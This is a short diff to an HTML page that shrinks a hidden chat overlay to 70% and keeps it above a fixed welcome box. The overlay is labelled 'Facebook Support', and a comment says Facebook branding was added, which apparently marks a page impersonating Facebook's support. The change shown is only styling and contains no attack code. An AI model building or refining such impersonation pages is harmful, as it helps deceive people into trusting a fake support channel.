@@ -1,12 +1,13 @@
 <html lang="en"><head>
   <style>
   <style>
-  /* Keep chat div as it is with just a higher z-index */
+   /* Make chat div 30% smaller than original */
   #chat {
-    /* Maintain original styling, just add z-index */
+    /* Scale down by 30% */
+    transform: scale(0.7) !important;
+    transform-origin: center top !important;
     z-index: 10000000 !important; /* Higher z-index than welcomeDiv */
   }
-
   /* Position welcomeDiv at 30% from the top */
   #welcomeDiv {
     position: fixed !important;
@@ -310,7 +311,8 @@ s0.parentNode.insertBefore(s1,s0);
       </div> -->
 <!-- Modified chat div with facebook branding -->
 <!-- Keep original chat div structure -->
-<div id="chat" style="display: none;">
+<!-- Chat div with 30% reduced size -->
+<div id="chat" style="display: none; transform: scale(0.7); transform-origin: center top;">
   <img src="images/msmm.png">
   <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Facebook Support</span>
   <br>
